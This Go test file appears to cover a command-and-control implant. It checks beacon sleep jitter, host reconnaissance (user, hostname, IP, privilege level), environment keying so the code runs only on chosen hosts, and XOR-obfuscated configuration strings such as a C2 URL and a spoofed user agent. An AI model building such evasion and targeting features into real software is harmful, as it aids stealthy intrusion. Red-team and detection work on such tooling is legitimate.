package main

import (
	"encoding/base64"
	"os"
	"testing"
	"time"
)

// --- calculateSleepTime Tests ---

func TestCalculateSleepTime_ZeroJitter(t *testing.T) {
	duration := calculateSleepTime(10, 0)
	expected := 10 * time.Second
	if duration != expected {
		t.Errorf("calculateSleepTime(10, 0) = %v, want %v", duration, expected)
	}
}

func TestCalculateSleepTime_ZeroInterval(t *testing.T) {
	duration := calculateSleepTime(0, 0)
	if duration != 0 {
		t.Errorf("calculateSleepTime(0, 0) = %v, want 0", duration)
	}
}

func TestCalculateSleepTime_WithJitter_InRange(t *testing.T) {
	interval := 10
	jitter := 50

	// Run multiple times to test the randomness boundaries
	for i := 0; i < 100; i++ {
		duration := calculateSleepTime(interval, jitter)
		seconds := int(duration / time.Second)

		// With 50% jitter on 10s interval:
		// Max jitter diff = 10 * 50/100 = 5
		// Range: [10-5, 10+5] = [5, 15], but clamped to min 1
		if seconds < 1 || seconds > 15 {
			t.Errorf("iteration %d: calculateSleepTime(%d, %d) = %v (%ds), want between 1s and 15s",
				i, interval, jitter, duration, seconds)
		}
	}
}

func TestCalculateSleepTime_FullJitter(t *testing.T) {
	interval := 10
	jitter := 100

	for i := 0; i < 100; i++ {
		duration := calculateSleepTime(interval, jitter)
		seconds := int(duration / time.Second)

		// With 100% jitter on 10s interval:
		// Max jitter diff = 10 * (0-99)/100
		// Range: [1, 20] (clamped to min 1)
		if seconds < 1 || seconds > 20 {
			t.Errorf("iteration %d: calculateSleepTime(%d, %d) = %v (%ds), out of expected range",
				i, interval, jitter, duration, seconds)
		}
	}
}

func TestCalculateSleepTime_MinClamp(t *testing.T) {
	// Small interval with high jitter should never go below 1 second
	interval := 1
	jitter := 100

	for i := 0; i < 100; i++ {
		duration := calculateSleepTime(interval, jitter)
		if duration < 1*time.Second {
			t.Errorf("iteration %d: calculateSleepTime(%d, %d) = %v, should not be less than 1s",
				i, interval, jitter, duration)
		}
	}
}

func TestCalculateSleepTime_LargeInterval(t *testing.T) {
	duration := calculateSleepTime(3600, 0) // 1 hour, no jitter
	expected := 3600 * time.Second
	if duration != expected {
		t.Errorf("calculateSleepTime(3600, 0) = %v, want %v", duration, expected)
	}
}

func TestCalculateSleepTime_OneSecond(t *testing.T) {
	duration := calculateSleepTime(1, 0)
	expected := 1 * time.Second
	if duration != expected {
		t.Errorf("calculateSleepTime(1, 0) = %v, want %v", duration, expected)
	}
}

// --- getHostname Tests ---

func TestGetHostname_NotEmpty(t *testing.T) {
	hostname := getHostname()
	if hostname == "" {
		t.Error("getHostname() returned empty string")
	}
}

func TestGetHostname_NotUnknown(t *testing.T) {
	// On a normal system, hostname should be available
	hostname := getHostname()
	if hostname == "unknown" {
		t.Log("getHostname() returned 'unknown' — may be expected in some environments")
	}
}

// --- getUsername Tests ---

func TestGetUsername_NotEmpty(t *testing.T) {
	username := getUsername()
	if username == "" {
		t.Error("getUsername() returned empty string")
	}
}

func TestGetUsername_NotUnknown(t *testing.T) {
	username := getUsername()
	if username == "unknown" {
		t.Log("getUsername() returned 'unknown' — may be expected in some environments")
	}
}

// --- getOperatingSystem Tests ---

func TestGetOperatingSystem_Linux(t *testing.T) {
	os := getOperatingSystem()
	if os != "linux" {
		t.Errorf("getOperatingSystem() = %q, want 'linux' (running on Linux)", os)
	}
}

// --- getInternalIP Tests ---

func TestGetInternalIP_NotEmpty(t *testing.T) {
	ip := getInternalIP()
	if ip == "" {
		t.Error("getInternalIP() returned empty string")
	}
}

func TestGetInternalIP_ValidFormat(t *testing.T) {
	ip := getInternalIP()
	// Should be either a valid IPv4 or "127.0.0.1" fallback
	parts := 0
	for _, c := range ip {
		if c == '.' {
			parts++
		}
	}
	if parts != 3 {
		t.Errorf("getInternalIP() = %q, doesn't look like a valid IPv4 address", ip)
	}
}

func TestGetInternalIP_NotLoopback(t *testing.T) {
	ip := getInternalIP()
	// On a system with network interfaces, should return a non-loopback address
	// (127.0.0.1 is the fallback when no interfaces are found)
	if ip == "127.0.0.1" {
		t.Log("getInternalIP() returned loopback — system may not have non-loopback interfaces")
	}
}

// --- getIntegrityLevel Tests ---

func TestGetIntegrityLevel_ValidRange(t *testing.T) {
	level := getIntegrityLevel()
	// Valid integrity levels: 1 (low), 2 (medium), 3 (high/admin), 4 (system/root)
	if level < 1 || level > 4 {
		t.Errorf("getIntegrityLevel() = %d, want 1-4", level)
	}
}

func TestGetIntegrityLevel_NonRootIsMedium(t *testing.T) {
	level := getIntegrityLevel()
	// Running tests as non-root should return 2 (medium)
	// Running as root should return 4 (system)
	if level != 2 && level != 4 {
		t.Errorf("getIntegrityLevel() = %d, want 2 (non-root) or 4 (root)", level)
	}
}

// --- regexMatch Tests ---

func TestRegexMatch_ExactMatch(t *testing.T) {
	if !regexMatch("WORKSTATION1", "WORKSTATION1") {
		t.Error("exact match should return true")
	}
}

func TestRegexMatch_CaseInsensitive(t *testing.T) {
	if !regexMatch("workstation1", "WORKSTATION1") {
		t.Error("case-insensitive match should return true")
	}
}

func TestRegexMatch_RegexPattern(t *testing.T) {
	if !regexMatch("WORK.*", "WORKSTATION1") {
		t.Error("wildcard pattern should match")
	}
}

func TestRegexMatch_DomainPattern(t *testing.T) {
	if !regexMatch(`.*\.contoso\.com`, "host.contoso.com") {
		t.Error("domain pattern should match FQDN")
	}
}

func TestRegexMatch_NoMatch(t *testing.T) {
	if regexMatch("SERVER.*", "WORKSTATION1") {
		t.Error("non-matching pattern should return false")
	}
}

func TestRegexMatch_InvalidRegex(t *testing.T) {
	// Invalid regex should fail closed (return false)
	if regexMatch("[invalid", "anything") {
		t.Error("invalid regex should return false (fail closed)")
	}
}

func TestRegexMatch_FullStringAnchored(t *testing.T) {
	// Pattern should match the FULL string, not just a substring
	if regexMatch("WORK", "WORKSTATION1") {
		t.Error("partial pattern should not match full string (anchored)")
	}
}

func TestRegexMatch_AlternationPattern(t *testing.T) {
	if !regexMatch("host1|host2|host3", "host2") {
		t.Error("alternation pattern should match")
	}
}

// --- checkEnvironmentKeys Tests ---

func TestCheckEnvironmentKeys_NoKeysConfigured(t *testing.T) {
	// When no keys are set, should pass
	envKeyHostname = ""
	envKeyDomain = ""
	envKeyUsername = ""
	envKeyProcess = ""
	if !checkEnvironmentKeys() {
		t.Error("no keys configured should pass")
	}
}

func TestCheckEnvironmentKeys_HostnameMatch(t *testing.T) {
	hostname, _ := os.Hostname()
	envKeyHostname = hostname
	envKeyDomain = ""
	envKeyUsername = ""
	envKeyProcess = ""
	if !checkEnvironmentKeys() {
		t.Errorf("hostname key %q should match current hostname %q", envKeyHostname, hostname)
	}
}

func TestCheckEnvironmentKeys_HostnameNoMatch(t *testing.T) {
	envKeyHostname = "IMPOSSIBLE-HOSTNAME-12345"
	envKeyDomain = ""
	envKeyUsername = ""
	envKeyProcess = ""
	if checkEnvironmentKeys() {
		t.Error("impossible hostname should not match")
	}
	envKeyHostname = "" // cleanup
}

func TestCheckEnvironmentKeys_UsernameMatch(t *testing.T) {
	username := getUsername()
	envKeyHostname = ""
	envKeyDomain = ""
	envKeyUsername = username
	envKeyProcess = ""
	if !checkEnvironmentKeys() {
		t.Errorf("username key %q should match current user", username)
	}
}

func TestCheckEnvironmentKeys_UsernameWildcard(t *testing.T) {
	envKeyHostname = ""
	envKeyDomain = ""
	envKeyUsername = ".*" // match any username
	envKeyProcess = ""
	if !checkEnvironmentKeys() {
		t.Error("wildcard username should match any user")
	}
	envKeyUsername = "" // cleanup
}

func TestCheckEnvironmentKeys_ProcessMatch(t *testing.T) {
	// The test runner process should always be running
	envKeyHostname = ""
	envKeyDomain = ""
	envKeyUsername = ""
	// On Linux, check for "init" or "systemd" which should always be running
	envKeyProcess = "systemd"
	result := checkEnvironmentKeys()
	// Reset before potential failure
	envKeyProcess = ""
	if !result {
		t.Log("systemd not found — may be expected in some environments")
	}
}

func TestCheckEnvironmentKeys_ProcessNoMatch(t *testing.T) {
	envKeyHostname = ""
	envKeyDomain = ""
	envKeyUsername = ""
	envKeyProcess = "impossible_process_name_xyz_999"
	if checkEnvironmentKeys() {
		t.Error("impossible process name should not match")
	}
	envKeyProcess = "" // cleanup
}

// --- getEnvironmentDomain Tests ---

func TestGetEnvironmentDomain_ReturnsString(t *testing.T) {
	domain := getEnvironmentDomain()
	// May be empty on non-domain joined systems
	t.Logf("getEnvironmentDomain() = %q", domain)
}

// --- isProcessRunning Tests ---

func TestIsProcessRunning_Init(t *testing.T) {
	// PID 1 should always exist on Linux
	if !isProcessRunning("systemd") && !isProcessRunning("init") {
		t.Log("neither systemd nor init found — may be expected in containers")
	}
}

func TestIsProcessRunning_Nonexistent(t *testing.T) {
	if isProcessRunning("totally_fake_process_xyz") {
		t.Error("fake process name should not be found")
	}
}

// --- xorDecodeString Tests ---

func TestXorDecodeString_RoundTrip(t *testing.T) {
	key := []byte{0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48}
	plaintext := "http://192.168.100.184"

	// Encode: XOR then base64
	data := []byte(plaintext)
	encoded := make([]byte, len(data))
	for i, b := range data {
		encoded[i] = b ^ key[i%len(key)]
	}
	encodedB64 := base64.StdEncoding.EncodeToString(encoded)

	// Decode
	result := xorDecodeString(encodedB64, key)
	if result != plaintext {
		t.Errorf("xorDecodeString roundtrip failed: got %q, want %q", result, plaintext)
	}
}

func TestXorDecodeString_EmptyString(t *testing.T) {
	key := []byte{0x01, 0x02}
	result := xorDecodeString("", key)
	if result != "" {
		t.Errorf("empty string should return empty, got %q", result)
	}
}

func TestXorDecodeString_EmptyKey(t *testing.T) {
	result := xorDecodeString("dGVzdA==", nil)
	// Empty key should return original encoded string
	if result != "dGVzdA==" {
		t.Errorf("empty key should return original, got %q", result)
	}
}

func TestXorDecodeString_NotBase64(t *testing.T) {
	key := []byte{0x01}
	// Invalid base64 should return original string
	result := xorDecodeString("not-valid-base64!!!", key)
	if result != "not-valid-base64!!!" {
		t.Errorf("invalid base64 should return original, got %q", result)
	}
}

func TestXorDecodeString_MultipleStrings(t *testing.T) {
	key := []byte("random32bytekeyforxorobfuscation")
	testCases := []string{
		"http://192.168.100.184",
		"443",
		"/data",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
		"aes-encryption-key-value-here",
		"some-uuid-1234-5678",
	}

	for _, tc := range testCases {
		data := []byte(tc)
		encoded := make([]byte, len(data))
		for i, b := range data {
			encoded[i] = b ^ key[i%len(key)]
		}
		encodedB64 := base64.StdEncoding.EncodeToString(encoded)

		result := xorDecodeString(encodedB64, key)
		if result != tc {
			t.Errorf("roundtrip failed for %q: got %q", tc, result)
		}
	}
}
